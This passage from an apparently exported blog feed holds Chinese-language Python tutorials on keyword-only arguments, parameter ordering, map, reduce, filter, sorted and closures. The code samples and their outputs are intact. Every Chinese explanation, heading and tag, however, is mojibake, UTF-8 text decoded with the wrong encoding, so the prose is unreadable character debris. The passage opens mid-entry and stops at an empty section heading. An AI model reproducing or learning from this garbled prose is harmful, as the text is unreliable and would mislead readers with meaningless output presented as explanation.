<p>å¯¹äºå…³é”®å­—å‚æ•°ï¼Œå‡½æ•°çš„è°ƒç”¨è€…å¯ä»¥ä¼ å…¥ä»»æ„ä¸å—é™åˆ¶çš„å…³é”®å­—å‚æ•°ã€‚å¦‚æœè¦é™åˆ¶å…³é”®å­—å‚æ•°çš„åå­—ï¼Œå¯ä»¥ç”¨å‘½åå…³é”®å­—å‚æ•°ã€‚ä¾‹å¦‚åªæ¥æ”¶<code>city</code>å’Œ<code>job</code>ä½œä¸ºå…³é”®å­—å‚æ•°ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">person</span>(<span class="params">name, age, *, city, job</span>):</span></span><br><span class="line">    print(name, age, city, job)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>å’Œå…³é”®å­—å‚æ•°<code>**kw</code>ä¸åŒï¼Œå‘½åå…³é”®å­—å‚æ•°éœ€è¦ä¸€ä¸ªç‰¹æ®Šåˆ†éš”ç¬¦<code>*</code>ï¼Œ<code>*</code>åé¢çš„å‚æ•°è¢«è§†ä¸ºå‘½åå…³é”®å­—å‚æ•°ã€‚</p>
<p>è°ƒç”¨æ–¹å¼å¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>person(<span class="string">&#x27;Jack&#x27;</span>, <span class="number">24</span>, city=<span class="string">&#x27;Beijing&#x27;</span>, job=<span class="string">&#x27;Engineer&#x27;</span>)</span><br><span class="line">Jack <span class="number">24</span> Beijing Engineer</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>å¦‚æœå‚æ•°ä¸­å·²ç»æœ‰ä¸€ä¸ªå¯å˜å‚æ•°ï¼Œåé¢è·Ÿç€çš„å‘½ä»¤å…³é”®å­—å‚æ•°å°±ä¸éœ€è¦åˆ†éš”ç¬¦<code>*</code>ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">person</span>(<span class="params">name, age, *args, city, job</span>):</span></span><br><span class="line">    print(name, age, args, city, job)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><strong>å‘½åå…³é”®å­—å‚æ•°å¿…é¡»ä¼ å…¥å‚æ•°åï¼Œè¿™å’Œä½ç½®å‚æ•°ä¸åŒã€‚</strong></p>
<h2 id="å‚æ•°ç»„åˆ">å‚æ•°ç»„åˆ</h2>
<p>å‚æ•°å®šä¹‰çš„é¡ºåºå¿…é¡»æ˜¯ï¼šå¿…é€‰å‚æ•°ã€é»˜è®¤å‚æ•°ã€å¯å˜å‚æ•°ã€å‘½åå…³é”®å­—å‚æ•°å’Œå…³é”®å­—å‚æ•°ã€‚ä¾‹å¦‚ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="function"><span class="keyword">def</span> <span class="title">f1</span>(<span class="params">a, b ,c=<span class="number">0</span>, *args, **kw</span>):</span></span><br><span class="line"><span class="meta">... </span>	print(<span class="string">&#x27;a =&#x27;</span>, a, <span class="string">&#x27;b =&#x27;</span>, b, <span class="string">&#x27;c =&#x27;</span>, c, <span class="string">&#x27;args =&#x27;</span>, args, <span class="string">&#x27;kw =&#x27;</span>, kw)</span><br><span class="line"><span class="meta">... </span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="function"><span class="keyword">def</span> <span class="title">f2</span>(<span class="params">a, b, c=<span class="number">0</span>, *, d, **kw</span>):</span></span><br><span class="line"><span class="meta">... </span>	print(<span class="string">&#x27;a =&#x27;</span>, a, <span class="string">&#x27;b =&#x27;</span>, b, <span class="string">&#x27;c =&#x27;</span>, c, <span class="string">&#x27;d =&#x27;</span>, d, <span class="string">&#x27;kw =&#x27;</span>, kw)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>å‡½æ•°è°ƒç”¨å¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>f1(<span class="number">1</span>,<span class="number">2</span>)</span><br><span class="line">a = <span class="number">1</span> b = <span class="number">2</span> c = <span class="number">0</span> args = () kw = &#123;&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>f1(<span class="number">1</span>,<span class="number">2</span>,c=<span class="number">3</span>)</span><br><span class="line">a = <span class="number">1</span> b = <span class="number">2</span> c = <span class="number">3</span> args = () kw = &#123;&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>f1(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>)</span><br><span class="line">a = <span class="number">1</span> b = <span class="number">2</span> c = <span class="number">3</span> args = () kw = &#123;&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>f1(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">a = <span class="number">1</span> b = <span class="number">2</span> c = <span class="number">3</span> args = (<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>) kw = &#123;&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>f1(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,x=<span class="number">99</span>)</span><br><span class="line">a = <span class="number">1</span> b = <span class="number">2</span> c = <span class="number">3</span> args = (<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>) kw = &#123;<span class="string">&#x27;x&#x27;</span>: <span class="number">99</span>&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>f2(<span class="number">1</span>,<span class="number">2</span>,d=<span class="number">99</span>,ext=<span class="literal">None</span>)</span><br><span class="line">a = <span class="number">1</span> b = <span class="number">2</span> c = <span class="number">0</span> d = <span class="number">99</span> kw = &#123;<span class="string">&#x27;ext&#x27;</span>: <span class="literal">None</span>&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>è¿˜å¯ä»¥ç”¨ä¸€ä¸ª<code>tuple</code>å’Œ<code>dict</code>è°ƒç”¨ä¸Šè¿°å‡½æ•°ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>args = (<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>kw = &#123;<span class="string">&#x27;d&#x27;</span>: <span class="number">99</span>, <span class="string">&#x27;x&#x27;</span>: <span class="string">&#x27;#&#x27;</span>&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>f1(*args, **kw)</span><br><span class="line">a = <span class="number">1</span> b = <span class="number">2</span> c = <span class="number">3</span> args = (<span class="number">4</span>,) kw = &#123;<span class="string">&#x27;d&#x27;</span>: <span class="number">99</span>, <span class="string">&#x27;x&#x27;</span>: <span class="string">&#x27;#&#x27;</span>&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>args = (<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>kw = &#123;<span class="string">&#x27;d&#x27;</span>:<span class="number">88</span>, <span class="string">&#x27;x&#x27;</span>:<span class="string">&#x27;#&#x27;</span>&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>f2(*args, **kw)</span><br><span class="line">a = <span class="number">1</span> b = <span class="number">2</span> c = <span class="number">3</span> d = <span class="number">88</span> kw = &#123;<span class="string">&#x27;x&#x27;</span>: <span class="string">&#x27;#&#x27;</span>&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="æ€»ç»“">æ€»ç»“</h2>
<ul>
<li><code>*args</code>æ˜¯å¯å˜å‚æ•°ï¼Œ<code>args</code>æ¥æ”¶ä¸€ä¸ª<code>tuple</code>ï¼›</li>
<li><code>**kw</code>æ˜¯å…³é”®å­—å‚æ•°ï¼Œ<code>kw</code>æ¥æ”¶ä¸€ä¸ª<code>dict</code>ï¼›</li>
<li>å¯å˜å‚æ•°æ—¢å¯ä»¥ç›´æ¥ä¼ å…¥ï¼š<code>func(1, 2, 3)</code>ï¼Œè¿˜å¯ä»¥ç»„è£…æˆä¸€ä¸ª<code>list</code>æˆ–<code>tuple</code>ä¼ å…¥ï¼š<code>func(*(1, 2, 3))</code>ï¼›</li>
<li>å…³é”®å­—å‚æ•°æ—¢å¯ä»¥ç›´æ¥ä¼ å…¥ï¼š<code>func(a=1, b=2)</code>ï¼Œè¿˜å¯ä»¥ç»„è£…æˆä¸€ä¸ª<code>dict</code>ä¼ å…¥ï¼š<code>func(**&#123;'a': 1, 'b': 2&#125;)</code>ï¼›</li>
<li>å‘½åå…³é”®å­—å‚æ•°æ˜¯ä¸ºäº†é™åˆ¶è°ƒç”¨è€…å¯ä»¥ä¼ å…¥çš„å‚æ•°åï¼ŒåŒæ—¶å¯ä»¥æä¾›é»˜è®¤å€¼ï¼›</li>
</ul>
]]></content>
      <categories>
        <category>ç¼–ç¨‹</category>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>Pythonå‡½æ•°å¼ç¼–ç¨‹ä¹‹é«˜é˜¶å‡½æ•°</title>
    <url>/Python/code/2.Python%E5%87%BD%E6%95%B0%E5%BC%8F%E7%BC%96%E7%A8%8B%E4%B9%8B%E9%AB%98%E9%98%B6%E5%87%BD%E6%95%B0/</url>
    <content><![CDATA[<h1 id="Pythonå‡½æ•°å¼ç¼–ç¨‹ä¹‹é«˜é˜¶å‡½æ•°">Pythonå‡½æ•°å¼ç¼–ç¨‹ä¹‹é«˜é˜¶å‡½æ•°</h1>
<p>ä»Šå¤©æˆ‘ä»¬å°±æ¥çœ‹å‡ ä¸ªPythonçš„é«˜çº§å‡½æ•°ï¼š<code>Map</code>ï¼Œ<code>Reduce</code>ï¼Œ<code>Filter</code>ï¼Œ<code>Sorted</code>ã€‚</p>
<h2 id="Map-Function">Map Function</h2>
<h3 id="Definition">Definition</h3>
<p><code>map()</code>å‡½æ•°æ¥æ”¶ä¸¤ä¸ªå‚æ•°ï¼Œä¸€ä¸ªæ˜¯å‡½æ•°ï¼Œä¸€ä¸ªæ˜¯<code>Iterable</code>ï¼Œ<code>map</code>å°†ä¼ å…¥çš„å‡½æ•°ä¾æ¬¡ä½œç”¨åˆ°åºåˆ—çš„æ¯ä¸ªå…ƒç´ ï¼Œå¹¶æŠŠç»“æœä½œä¸ºæ–°çš„<code>Iterable</code>è¿”å›ã€‚</p>
<h3 id="Example">Example</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="function"><span class="keyword">def</span> <span class="title">f</span>(<span class="params">x</span>):</span></span><br><span class="line"><span class="meta">... </span>	<span class="keyword">return</span> x*x</span><br><span class="line"><span class="meta">... </span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>r = map(f, [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>])</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>r</span><br><span class="line">&lt;map object at <span class="number">0x0000020AAF4C1668</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>list(r)</span><br><span class="line">[<span class="number">1</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">16</span>, <span class="number">25</span>, <span class="number">36</span>, <span class="number">49</span>, <span class="number">64</span>, <span class="number">81</span>, <span class="number">100</span>]</span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>list(map(str, [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>]))</span><br><span class="line">[<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;8&#x27;</span>, <span class="string">&#x27;9&#x27;</span>, <span class="string">&#x27;10&#x27;</span>]</span><br></pre></td></tr></table></figure>
<h2 id="Reduce-Function">Reduce Function</h2>
<h3 id="Definition-v2">Definition</h3>
<p><code>reduce()</code>å‡½æ•°å’Œ<code>map()</code>ç›¸ä¼¼ï¼Œæ¥æ”¶ä¸¤ä¸ªå‚æ•°ï¼Œä¸€ä¸ªæ˜¯å‡½æ•°ï¼Œä¸€ä¸ª<code>Iterable</code>ã€‚ä¸åŒçš„æ˜¯ï¼Œ<code>reduce()</code>æŠŠä¸€ä¸ªå‡½æ•°ä½œç”¨åœ¨ä¸€ä¸ªåºåˆ—<code>[x1, x2, x3, ...]</code>ä¸Šï¼Œå¹¶ä¸”è¿™ä¸ªå‡½æ•°å¿…é¡»æ¥æ”¶ä¸¤ä¸ªå‚æ•°ï¼Œ<code>reduce()</code>æŠŠç»“æœç»§ç»­å’Œåºåˆ—çš„ä¸‹ä¸€ä¸ªå…ƒç´ åšç´¯ç§¯è®¡ç®—ï¼Œå½¢å¦‚ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">reduce(f, [x1, x2, x3, x4]) = f(f(f(x1, x2), x3), x4)</span><br></pre></td></tr></table></figure>
<h3 id="Example-v2">Example</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> functools <span class="keyword">import</span> reduce</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="function"><span class="keyword">def</span> <span class="title">fn</span>(<span class="params">x, y</span>):</span></span><br><span class="line"><span class="meta">... </span>	<span class="keyword">return</span> x*<span class="number">10</span> + y</span><br><span class="line"><span class="meta">... </span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>reduce(fn, [<span class="number">1</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">9</span>])</span><br><span class="line"><span class="number">13579</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># é…åˆmap()ï¼Œæˆ‘ä»¬å°±å¯ä»¥å†™å‡ºæŠŠstrè½¬æ¢ä¸ºintçš„å‡½æ•°</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="function"><span class="keyword">def</span> <span class="title">char2nums</span>(<span class="params">s</span>):</span></span><br><span class="line"><span class="meta">... </span>	digits = &#123;<span class="string">&#x27;0&#x27;</span>: <span class="number">0</span>, <span class="string">&#x27;1&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;2&#x27;</span>: <span class="number">2</span>, <span class="string">&#x27;3&#x27;</span>: <span class="number">3</span>, <span class="string">&#x27;4&#x27;</span>: <span class="number">4</span>, <span class="string">&#x27;5&#x27;</span>: <span class="number">5</span>, <span class="string">&#x27;6&#x27;</span>: <span class="number">6</span>, <span class="string">&#x27;7&#x27;</span>: <span class="number">7</span>, <span class="string">&#x27;8&#x27;</span>: <span class="number">8</span>, <span class="string">&#x27;9&#x27;</span>: <span class="number">9</span>&#125;</span><br><span class="line"><span class="meta">... </span>	<span class="keyword">return</span> digits[s]</span><br><span class="line"><span class="meta">... </span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>reduce(fn, map(char2nums, <span class="string">&#x27;1234&#x27;</span>))</span><br><span class="line"><span class="number">1234</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>ä½¿ç”¨lambdaè¡¨è¾¾å¼å¯ä»¥è¿›ä¸€æ­¥åŒ–ç®€ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> reduce</span><br><span class="line"></span><br><span class="line">DIGITS = &#123;<span class="string">&#x27;0&#x27;</span>: <span class="number">0</span>, <span class="string">&#x27;1&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;2&#x27;</span>: <span class="number">2</span>, <span class="string">&#x27;3&#x27;</span>: <span class="number">3</span>, <span class="string">&#x27;4&#x27;</span>: <span class="number">4</span>, <span class="string">&#x27;5&#x27;</span>: <span class="number">5</span>, <span class="string">&#x27;6&#x27;</span>: <span class="number">6</span>, <span class="string">&#x27;7&#x27;</span>: <span class="number">7</span>, <span class="string">&#x27;8&#x27;</span>: <span class="number">8</span>, <span class="string">&#x27;9&#x27;</span>: <span class="number">9</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">char2num</span>(<span class="params">s</span>):</span></span><br><span class="line"> <span class="keyword">return</span> DIGITS[s]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">str2int</span>(<span class="params">s</span>):</span></span><br><span class="line"> <span class="keyword">return</span> reduce(<span class="keyword">lambda</span> x, y: x * <span class="number">10</span> + y, map(char2num, s))</span><br></pre></td></tr></table></figure>
</blockquote>
<h3 id="Exercise">Exercise</h3>
<p>åˆ©ç”¨<code>map</code>å’Œ<code>reduce</code>ç¼–å†™ä¸€ä¸ª<code>str2float</code>å‡½æ•°ï¼ŒæŠŠå­—ç¬¦ä¸²<code>'123.456'</code>è½¬æ¢æˆæµ®ç‚¹æ•°<code>123.456</code>ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f</span>(<span class="params">dig</span>):</span></span><br><span class="line">    dict = &#123;<span class="string">&#x27;0&#x27;</span>:<span class="number">0</span>, <span class="string">&#x27;1&#x27;</span>:<span class="number">1</span>, <span class="string">&#x27;2&#x27;</span>:<span class="number">2</span>, <span class="string">&#x27;3&#x27;</span>:<span class="number">3</span>, <span class="string">&#x27;4&#x27;</span>:<span class="number">4</span>, <span class="string">&#x27;5&#x27;</span>:<span class="number">5</span>, <span class="string">&#x27;6&#x27;</span>:<span class="number">6</span>, <span class="string">&#x27;7&#x27;</span>:<span class="number">7</span>, <span class="string">&#x27;8&#x27;</span>:<span class="number">8</span>, <span class="string">&#x27;9&#x27;</span>:<span class="number">9</span>&#125;</span><br><span class="line">    <span class="keyword">return</span> dict[dig]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">g</span>(<span class="params">x, y</span>):</span></span><br><span class="line">    <span class="keyword">return</span> x*<span class="number">10</span>+y</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">h</span>(<span class="params">a, b</span>):</span></span><br><span class="line">    <span class="keyword">return</span> (a/<span class="number">10</span>+b)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">str2float</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="keyword">return</span> reduce(g, map(f,s[:s.find(<span class="string">&#x27;.&#x27;</span>)])) + reduce(h, map(f, s[<span class="number">-1</span>:-(len(s)-s.find(<span class="string">&#x27;.&#x27;</span>)):<span class="number">-1</span>]))/<span class="number">10</span></span><br></pre></td></tr></table></figure>
<h2 id="Filter-Function">Filter Function</h2>
<h3 id="Definition-v3">Definition</h3>
<p>å’Œ<code>map()</code>ç±»ä¼¼ï¼Œ<code>filter()</code>ä¹Ÿæ¥æ”¶ä¸€ä¸ªå‡½æ•°å’Œä¸€ä¸ªåºåˆ—ã€‚å’Œ<code>map()</code>ä¸åŒçš„æ˜¯ï¼Œ<code>filter()</code>æŠŠä¼ å…¥çš„å‡½æ•°ä¾æ¬¡ä½œç”¨äºæ¯ä¸ªå…ƒç´ ï¼Œç„¶åæ ¹æ®è¿”å›å€¼æ˜¯<code>True</code>è¿˜æ˜¯<code>False</code>å†³å®šä¿ç•™è¿˜æ˜¯ä¸¢å¼ƒè¯¥å…ƒç´ ã€‚<code>filter()</code>å‡½æ•°è¿”å›çš„æ˜¯ä¸€ä¸ª<code>Iterator</code>ï¼Œä¹Ÿå°±æ˜¯ä¸€ä¸ªæƒ°æ€§åºåˆ—ã€‚</p>
<h3 id="Example-v3">Example</h3>
<p>åœ¨ä¸€ä¸ªlistä¸­ï¼Œåˆ æ‰å¶æ•°ï¼Œåªä¿ç•™å¥‡æ•°ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">is_odd</span>(<span class="params">n</span>):</span></span><br><span class="line">    <span class="keyword">return</span> n % <span class="number">2</span></span><br><span class="line"></span><br><span class="line">list(filter(is_odd, [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>]))</span><br></pre></td></tr></table></figure>
<p>æŠŠä¸€ä¸ªåºåˆ—ä¸­çš„ç©ºå­—ç¬¦ä¸²åˆ æ‰ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">not_empty</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="keyword">return</span> s <span class="keyword">and</span> s.strip()</span><br><span class="line"></span><br><span class="line">list(filter(not_empty, [<span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;B&#x27;</span>, <span class="literal">None</span>, <span class="string">&#x27;C&#x27;</span>, <span class="string">&#x27;  &#x27;</span>]))</span><br></pre></td></tr></table></figure>
<h3 id="Exercise-v2">Exercise</h3>
<p>å›æ•°æ˜¯æŒ‡ä»å·¦å‘å³è¯»å’Œä»å³å‘å·¦è¯»éƒ½æ˜¯ä¸€æ ·çš„æ•°ï¼Œä¾‹å¦‚<code>12321</code>ï¼Œ<code>909</code>ã€‚è¯·åˆ©ç”¨<code>filter()</code>ç­›é€‰å‡ºå›æ•°ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">is_palindrome</span>(<span class="params">n</span>):</span></span><br><span class="line">    <span class="keyword">return</span> str(n)==str(n)[::<span class="number">-1</span>]</span><br><span class="line"></span><br><span class="line">output = filter(is_palindrome, range(<span class="number">1</span>, <span class="number">1000</span>))</span><br></pre></td></tr></table></figure>
<h2 id="Sorted-Function">Sorted Function</h2>
<h3 id="Definition-v4">Definition</h3>
<p><code>sorted()</code>å‡½æ•°é™¤äº†å¯ä»¥å¯¹<code>list</code>è¿›è¡Œæ’åºä¹‹å¤–ï¼Œå®ƒè¿˜å¯ä»¥æ¥æ”¶ä¸€ä¸ª<code>key</code>å‡½æ•°æ¥å®ç°è‡ªå®šä¹‰æ’åºã€‚</p>
<h3 id="Example-v4">Example</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>sorted([<span class="number">36</span>, <span class="number">5</span>, <span class="number">-12</span>, <span class="number">9</span>, <span class="number">-21</span>])</span><br><span class="line">[<span class="number">-21</span>, <span class="number">-12</span>, <span class="number">5</span>, <span class="number">9</span>, <span class="number">36</span>]</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>sorted([<span class="number">36</span>, <span class="number">5</span>, <span class="number">-12</span>, <span class="number">9</span>, <span class="number">-21</span>], key=abs)</span><br><span class="line">[<span class="number">5</span>, <span class="number">9</span>, <span class="number">-12</span>, <span class="number">-21</span>, <span class="number">36</span>]</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>ç¼–ç¨‹</category>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>å‡½æ•°å¼ç¼–ç¨‹</tag>
      </tags>
  </entry>
  <entry>
    <title>Pythonå‡½æ•°å¼ç¼–ç¨‹-é—­åŒ…</title>
    <url>/Python/code/3.Python%E5%87%BD%E6%95%B0%E5%BC%8F%E7%BC%96%E7%A8%8B-%E9%97%AD%E5%8C%85/</url>
    <content><![CDATA[<h1 id="Pythonå‡½æ•°å¼ç¼–ç¨‹-é—­åŒ…">Pythonå‡½æ•°å¼ç¼–ç¨‹-é—­åŒ…</h1>
<p>æ¬è¿è‡ªhttps://serholiu.com/python-closures</p>
<p>é¦–å…ˆç»™å‡ºé—­åŒ…çš„ä¸€ç§æµ…æ˜¾çš„å®šä¹‰ï¼ˆå¯èƒ½ä¸å¤Ÿå‡†ç¡®ï¼‰ï¼šè¦å½¢æˆé—­åŒ…ï¼Œé¦–å…ˆå¾—æœ‰ä¸€ä¸ªåµŒå¥—çš„å‡½æ•°ï¼Œå³å‡½æ•°ä¸­å®šä¹‰äº†å¦ä¸€ä¸ªå‡½æ•°ï¼Œé—­åŒ…åˆ™æ˜¯ä¸€ä¸ªé›†åˆï¼Œå®ƒåŒ…æ‹¬äº†å¤–éƒ¨å‡½æ•°çš„å±€éƒ¨å˜é‡ï¼Œè¿™äº›å±€éƒ¨å˜é‡åœ¨å¤–éƒ¨å‡½æ•°è¿”å›åä¹Ÿç»§ç»­å­˜åœ¨ï¼Œå¹¶èƒ½è¢«å†…éƒ¨å‡½æ•°å¼•ç”¨ã€‚</p>
<h2 id="ä¸¾ä¸ªä¾‹å­">ä¸¾ä¸ªä¾‹å­</h2>
<p>å®šä¹‰ä¸€ä¸ªå‡½æ•° <code>generate_power_func</code>ï¼Œå®ƒè¿”å›å¦ä¸€ä¸ªå‡½æ•°ï¼Œç°åœ¨é—­åŒ…å½¢æˆçš„æ¡ä»¶å·²ç»è¾¾åˆ°ã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_power_func</span>(<span class="params">n</span>):</span></span><br><span class="line">    print(<span class="string">&#x27;id(n): %X&#x27;</span> % id(n))</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">nth_power</span>(<span class="params">x</span>):</span></span><br><span class="line">        <span class="keyword">return</span> x**n</span><br><span class="line">    print(<span class="string">&#x27;id(nth_power): %X&#x27;</span> % id(nth_power))</span><br><span class="line">    <span class="keyword">return</span> nth_power</span><br></pre></td></tr></table></figure>
<p>å¯¹äºå†…éƒ¨å‡½æ•° <code>nth_power</code>ï¼Œå®ƒèƒ½å¼•ç”¨åˆ°å¤–éƒ¨å‡½æ•°çš„å±€éƒ¨å˜é‡ <code>n</code>ï¼Œè€Œä¸”å³ä½¿ <code>generate_power_func</code> å·²ç»è¿”å›ã€‚æŠŠè¿™ç§ç°è±¡å°±ç§°ä¸ºé—­åŒ…ã€‚å…·ä½“ä½¿ç”¨ä¸€ä¸‹ã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>raised_to_4 = generate_power_func(<span class="number">4</span>)</span><br><span class="line">id(n): <span class="number">7</span>FF968E462F0</span><br><span class="line">id(nth_power): <span class="number">1</span>A5E3415510</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>repr(raised_to_4)</span><br><span class="line"><span class="string">&#x27;&lt;function generate_power_func.&lt;locals&gt;.nth_power at 0x000001A5E3415510&gt;&#x27;</span></span><br></pre></td></tr></table></figure>
<p>å¯ä»¥çœ‹å‡ºï¼Œå½“<code>generate_power_func(4)</code>æ‰§è¡Œåï¼Œåˆ›å»ºå¹¶è¿”å›äº†<code>nth_power</code>è¿™ä¸ªå‡½æ•°å¯¹è±¡ï¼Œå†…å­˜åœ°å€æ˜¯<code>1A5E3415510</code>ï¼Œå¹¶ä¸”å‘ç°<code>raised_to_4</code>å’Œå®ƒçš„å†…å­˜åœ°å€ç›¸åŒï¼Œ**å³<code>raised_to_4</code>**åªæ˜¯è¿™ä¸ªå‡½æ•°å¯¹è±¡çš„ä¸€ä¸ªå¼•ç”¨ã€‚å…ˆåœ¨å…¨å±€å‘½åç©ºé—´ä¸­åˆ é™¤ <code>generate_power_func</code>ï¼Œå†è¯•è¯•ä¼šå‡ºç°ä»€ä¹ˆç»“æœã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">del</span> generate_power_func</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>raised_to_4(<span class="number">2</span>)</span><br><span class="line"><span class="number">16</span></span><br></pre></td></tr></table></figure>
<p>è¿™å°±æ˜¯é—­åŒ…çš„ä½œç”¨ï¼Œå¤–éƒ¨å‡½æ•°çš„å±€éƒ¨å˜é‡å¯ä»¥è¢«å†…éƒ¨å‡½æ•°å¼•ç”¨ï¼Œå³ä½¿å¤–éƒ¨å‡½æ•°å·²ç»è¿”å›äº†ã€‚</p>
<h2 id="closure-å±æ€§å’Œcellå¯¹è±¡">__closure__å±æ€§å’Œcellå¯¹è±¡</h2>
